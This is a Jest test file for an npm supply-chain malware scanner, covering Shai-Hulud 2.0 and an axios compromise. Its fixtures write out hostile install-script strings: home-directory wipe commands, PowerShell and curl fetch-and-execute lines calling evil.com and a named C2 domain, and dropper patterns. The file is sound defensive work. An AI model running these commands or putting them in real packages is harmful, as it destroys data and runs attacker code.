import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import { analyzeScripts, scanProject } from '../src/index';

const TEST_DIR = path.join(__dirname, 'temp_research_test');

describe('Research Heuristics (Shai-Hulud 2.0)', () => {
  beforeAll(() => {
    if (fs.existsSync(TEST_DIR)) {
      fs.rmSync(TEST_DIR, { recursive: true, force: true });
    }
    if (!fs.existsSync(TEST_DIR)) {
      fs.mkdirSync(TEST_DIR);
    }
  });

  afterAll(() => {
    if (fs.existsSync(TEST_DIR)) {
      fs.rmSync(TEST_DIR, { recursive: true, force: true });
    }
  });

  describe('Script Analysis', () => {
    test('should detect destructive shred command', () => {
      const pkg = {
        scripts: {
          cleanup: 'shred -uvz -n 1 /home/user',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect destructive Windows del command', () => {
      const pkg = {
        scripts: {
          cleanup: 'del /F /Q /S "%USERPROFILE%*"',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect PowerShell Bun install', () => {
      const pkg = {
        scripts: {
          install: 'irm bun.sh/install.ps1|iex',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'install': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect C2 signature', () => {
      const pkg = {
        scripts: {
          postinstall: 'echo "Sha1-Hulud: The Second Coming"',
        },
      };
      const findings = analyzeScripts(pkg);
      // "The Second Coming" is in the signatures list
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'postinstall': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });
  });

  describe('Entropy Analysis', () => {
    test('should detect high entropy in large files', async () => {
      const malwareFile = 'bun_environment.js';
      const malwarePath = path.join(TEST_DIR, malwareFile);

      // Create a large file (> 5MB) with high entropy (random data)
      const size = 6 * 1024 * 1024; // 6MB
      const buffer = crypto.randomBytes(size);
      fs.writeFileSync(malwarePath, buffer);

      // Create a dummy package.json
      fs.writeFileSync(
        path.join(TEST_DIR, 'package.json'),
        JSON.stringify({ name: 'test-pkg', version: '1.0.0' }),
      );

      // Scan
      try {
        const result = await scanProject(TEST_DIR, []);
        const entropyWarning = result.warnings.find(
          (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
        );
        expect(entropyWarning).toBeDefined();
        expect(entropyWarning).toContain(malwareFile);
      } catch {
        // scanProject might throw if no lockfile, but we are testing file scanning which happens before lockfile check?
        // Actually scanProject throws if no lockfile is found.
        // Let's create a dummy lockfile to satisfy it.
        fs.writeFileSync(
          path.join(TEST_DIR, 'package-lock.json'),
          JSON.stringify({
            name: 'test-pkg',
            version: '1.0.0',
            lockfileVersion: 2,
            packages: {},
          }),
        );

        const result = await scanProject(TEST_DIR, []);
        const entropyWarning = result.warnings.find(
          (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
        );
        expect(entropyWarning).toBeDefined();
      }
    }, 30000);

    test('should NOT flag low entropy large files', async () => {
      const safeFile = 'bun_environment.js'; // Reusing name to trigger check, but content is safe
      const safePath = path.join(TEST_DIR, safeFile);

      // Create a large file (> 5MB) with low entropy (repeated char)
      const size = 6 * 1024 * 1024; // 6MB
      const buffer = Buffer.alloc(size, 'A');
      fs.writeFileSync(safePath, buffer);

      // Ensure package.json and lockfile exist (from previous test)
      if (!fs.existsSync(path.join(TEST_DIR, 'package.json'))) {
        fs.writeFileSync(
          path.join(TEST_DIR, 'package.json'),
          JSON.stringify({ name: 'test-pkg', version: '1.0.0' }),
        );
      }
      if (!fs.existsSync(path.join(TEST_DIR, 'package-lock.json'))) {
        fs.writeFileSync(
          path.join(TEST_DIR, 'package-lock.json'),
          JSON.stringify({
            name: 'test-pkg',
            version: '1.0.0',
            lockfileVersion: 2,
            packages: {},
          }),
        );
      }

      const result = await scanProject(TEST_DIR, []);
      const entropyWarning = result.warnings.find(
        (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
      );
      expect(entropyWarning).toBeUndefined();

      // It might still be flagged as "Suspicious file" because of the name, but NOT "HIGH RISK ... High Entropy"
      const suspiciousWarning = result.warnings.find((w) => w.includes('Suspicious file detected'));
      expect(suspiciousWarning).toBeDefined();
    }, 30000);
  });
});

describe('Axios Supply Chain Attack Detection (March 2026)', () => {
  describe('Script Analysis - Axios Patterns', () => {
    test('should detect plain-crypto-js as known malware signature', () => {
      const pkg = {
        scripts: {
          postinstall: 'node -e "require(\'plain-crypto-js\')"',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect sfrclak.com C2 domain in scripts', () => {
      const pkg = {
        scripts: {
          postinstall: 'curl http://sfrclak.com:8000/6202033 -o payload',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect OrDeR_7077 XOR key in scripts', () => {
      const pkg = {
        scripts: {
          postinstall: "node -e \"var key='OrDeR_7077'; decode(stq)\"",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect nohup RAT dropper pattern', () => {
      // Test string that matches the execSync+nohup pattern used in the axios attack dropper
      const pkg = {
        scripts: {
          postinstall: "execSync('nohup ./payload &')",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Background process execution'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect self-deleting dropper script pattern', () => {
      const pkg = {
        scripts: {
          postinstall: "fs.unlink('setup.js', () => {})",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Self-deleting dropper script'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect PowerShell irm|iex remote execution', () => {
      const pkg = {
        scripts: {
          postinstall: 'irm https://evil.com/payload.ps1 | iex',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('PowerShell remote execution'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect spoofed User-Agent string from axios attack', () => {
      const pkg = {
        scripts: {
          postinstall:
            'curl -A "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)" http://evil.com',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect node setup.js execution', () => {
      const pkg = {
        scripts: {
          postinstall: 'node setup.js',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });
  });

  describe('Known Threats CSV - Axios Packages', () => {
    const csvPath = path.join(__dirname, '..', 'sources', 'known-threats.csv');

    test('should include axios compromised versions', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('axios,1.14.1');
      expect(content).toContain('axios,0.30.4');
    });

    test('should include plain-crypto-js', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('plain-crypto-js,4.2.1');
      expect(content).toContain('plain-crypto-js,4.2.0');
    });

    test('should include related attacker packages', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('@shadanai/openclaw');
      expect(content).toContain('@qqbrowser/openclaw-qbot,0.0.130');
    });
  });
});
